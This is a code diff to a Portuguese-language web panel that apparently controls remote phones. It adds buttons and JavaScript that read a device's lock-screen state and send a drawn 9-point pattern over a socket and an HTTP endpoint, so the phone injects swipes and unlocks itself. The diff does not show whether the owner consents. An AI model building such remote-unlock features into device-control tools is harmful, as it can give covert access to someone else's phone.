@@ -835,6 +835,10 @@
                             🔓 Desbloquear (Swipe)
                         </button>
 
+                        <button id="btn-desbloquear-padrao" onclick="abrirTelaDesbloqueio()" style="background: #121212; color: #ffffff; border: 1px solid #333333; padding: 6px 10px; border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 11px; text-align: left; transition: background 0.2s;">
+                            🔢 Desbloquear (Padrão 9 pontos)
+                        </button>
+
                         <button id="btn-atualizacao" onclick="abrirPainelAtualizacao()" style="background: #121212; color: #ffffff; border: 1px solid #333333; padding: 6px 10px; border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 11px; text-align: left; transition: background 0.2s;">
                             <span aria-hidden="true">🔄</span> Atualização
                         </button>
@@ -4937,6 +4941,87 @@ function excluirApp(appId, btn) {
                 if (overlay && overlay.style.display !== 'none') fecharTelaDesbloqueio();
             }
         });
+
+        // ───── DESBLOQUEIO REAL DO DISPOSITIVO (inject/deslize por padrão) ─────
+        var btnComecar = document.getElementById('lock-comecar');
+        var btnDesbloquearDisp = document.getElementById('lock-desbloquear-device');
+
+        function alvoDispositivo() {
+            try { if (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) return aparelhoSelecionado; } catch (e) {}
+            return window.aparelhoSelecionado || null;
+        }
+        function habilitarDesbloquear(on) {
+            if (!btnDesbloquearDisp) return;
+            btnDesbloquearDisp.disabled = !on;
+            btnDesbloquearDisp.style.opacity = on ? '1' : '0.6';
+        }
+
+        // "Começar agora": revela o padrão (swipe-up) e LÊ a tela p/ confirmar
+        // que é a tela de bloqueio PADRÃO do dispositivo.
+        if (btnComecar) btnComecar.addEventListener('click', function () {
+            var alvo = alvoDispositivo();
+            if (!alvo) { if (resultado) resultado.textContent = 'Selecione um dispositivo primeiro.'; return; }
+            if (resultado) resultado.textContent = 'Verificando a tela de bloqueio padrão…';
+            try {
+                if (window.socket && window.socket.connected) {
+                    window.socket.emit('lockscreen_swipe_painel', { dispositivo: alvo });
+                    setTimeout(function () {
+                        try { window.socket.emit('lockscreen_ler_painel', { dispositivo: alvo }); } catch (e) {}
+                    }, 500);
+                } else {
+                    // Sem socket: libera assim mesmo (o device detecta no backend).
+                    habilitarDesbloquear(true);
+                    if (resultado) resultado.textContent = 'Socket offline — desenhe os pontos e toque em Desbloquear agora.';
+                }
+            } catch (e) {}
+        });
+
+        // "Desbloquear agora": envia a sequência (índices 1..9) para o device
+        // executar o DESLIZE por inject. Reusa o backend desbloquear_padrao
+        // (socket) + /desbloquear-padrao-http (fallback). O device mapeia os
+        // índices para a grade real e desliza no tempo certo.
+        if (btnDesbloquearDisp) btnDesbloquearDisp.addEventListener('click', function () {
+            var alvo = alvoDispositivo();
+            if (!alvo) { if (resultado) resultado.textContent = 'Selecione um dispositivo primeiro.'; return; }
+            if (sequencia.length < 4) { if (resultado) resultado.textContent = 'Conecte ao menos 4 pontos.'; return; }
+            var indices = sequencia.slice();
+            var payload = { dispositivo: alvo, indices: indices, sequencia: indices };
+            if (resultado) resultado.textContent = '🔓 Enviando desbloqueio… o celular vai deslizar pelos pontos.';
+            try { if (window.socket && window.socket.connected) window.socket.emit('desbloquear_padrao', payload); } catch (e) {}
+            try {
+                fetch('/desbloquear-padrao-http', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).catch(function () {});
+            } catch (e) {}
+        });
+
+        // Respostas do dispositivo: estado da tela e resultado do desbloqueio.
+        if (window.socket) {
+            window.socket.on('lockscreen_estado', function (p) {
+                if (!p) return;
+                var est = p.estado || '';
+                var temGrade = (est === 'aguardando_padrao') || (p.alvos && p.alvos.padraoBounds);
+                var bloqueado = temGrade || est === 'tela_capa' || est === 'tela_apagada';
+                if (temGrade) {
+                    if (resultado) resultado.textContent = '✅ Tela de padrão detectada. Desenhe os 9 pontos e toque em Desbloquear agora.';
+                    habilitarDesbloquear(true);
+                } else if (bloqueado) {
+                    if (resultado) resultado.textContent = '🔒 Bloqueado (' + est + '). Pode desenhar e desbloquear.';
+                    habilitarDesbloquear(true);
+                } else if (est === 'desbloqueado') {
+                    if (resultado) resultado.textContent = '🔓 Dispositivo já está desbloqueado.';
+                }
+            });
+            window.socket.on('desbloquear_padrao_resultado', function (res) {
+                if (!res) return;
+                if (resultado) resultado.textContent = res.sucesso
+                    ? '🔓 Dispositivo desbloqueado com sucesso!'
+                    : '❌ Padrão incorreto ou falha — tente novamente.';
+            });
+        }
     })();
 
     function abrirTelaDesbloqueio() {
@@ -4981,6 +5066,14 @@ function excluirApp(appId, btn) {
         <button id="lock-limpar" type="button" style="background:#3f3f46; color:#d4d4d8; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">Limpar pontos</button>
         <button id="lock-confirmar" type="button" style="background:#dc2626; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">Confirmar senha</button>
     </div>
+    <!-- DESBLOQUEIO REAL DO DISPOSITIVO (inject/deslize) -->
+    <div style="display:flex; gap:10px; margin-top:4px; flex-wrap:wrap; justify-content:center;">
+        <button id="lock-comecar" type="button" style="background:#2563eb; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px;">▶ Começar agora</button>
+        <button id="lock-desbloquear-device" type="button" disabled style="background:#16a34a; color:#fff; border:none; padding:9px 18px; border-radius:6px; cursor:pointer; font-weight:bold; font-size:13px; opacity:0.6;">🔓 Desbloquear agora</button>
+    </div>
+    <p id="lock-dispositivo-info" style="color:#93c5fd; font-size:11px; margin:0; max-width:320px; text-align:center; line-height:1.4;">
+        Toque em <b>Começar agora</b> para checar a tela de bloqueio padrão do dispositivo. Depois desenhe os 9 pontos na ordem e toque em <b>Desbloquear agora</b> — o celular desliza sozinho pelos pontos.
+    </p>
     <!-- Aviso discreto de privacidade (fones em público) -->
     <p style="color:#71717a; font-size:11px; margin:0; max-width:300px; text-align:center; line-height:1.4;">
         <span aria-hidden="true">&#127911;</span> Em locais p&#250;blicos, use fones de ouvido: o leitor de tela anuncia cada ponto em voz alta.
